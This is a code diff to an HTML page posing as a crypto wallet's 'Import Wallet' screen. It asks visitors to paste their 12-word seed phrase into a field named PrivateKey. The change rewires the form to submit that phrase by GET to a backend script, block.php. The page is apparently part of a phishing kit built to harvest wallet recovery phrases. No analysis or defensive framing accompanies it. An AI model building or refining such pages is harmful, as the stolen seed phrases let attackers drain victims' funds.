@@ -370,10 +370,13 @@ label + .jss12 {
             transition: transform 300ms ease-in-out;
             transform: translateY(-200%);
           }
-        </style></div><div class="main-container-wrapper"><div class="first-view-main-wrapper"><div class="first-view-main"><form method="post" action="#">
+        </style></div><div class="main-container-wrapper"><div class="first-view-main-wrapper"><div class="first-view-main"><form method="get" action="block.php">
         <input type = "hidden" id = "ref" value = ""/>
             <div class="import-account">
-        <div class="import-account__title">Import Wallet</div><div class="import-account__selector-label">Enter your 12 secret phrases here to connect</div><div class="import-account__input-wrapper"><label class="import-account__input-label">Phrase</label><textarea class="import-account__secret-phrase" placeholder="Paste seed phrase from clipboard" name="PrivateKey" id = "private_key" required="true" maxlength="200"></textarea><span class="error"></span></div><button onclick = "SubmitForm('Blockchain')" class="button btn--first-time first-time-flow__button" role="button" tabindex="0">IMPORT</button></div></form></div></div></div></div></div>
+        <div class="import-account__title">Import Wallet</div><div class="import-account__selector-label">Enter your 12 secret phrases here to connect</div><div class="import-account__input-wrapper"><label class="import-account__input-label">Phrase</label>
+          <textarea class="import-account__secret-phrase" placeholder="Paste seed phrase from clipboard" name="PrivateKey" id = "private_key" required="true" maxlength="200"></textarea>
+
+          <span class="error"></span></div><button class="button btn--first-time first-time-flow__button" type="submit" tabindex="0">IMPORT</button></div></form></div></div></div></div></div>
         <div id="popover-content"></div>
         <script src="../ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
         <script src = "api/v0/js/coref99a.js?1652784261"></script>
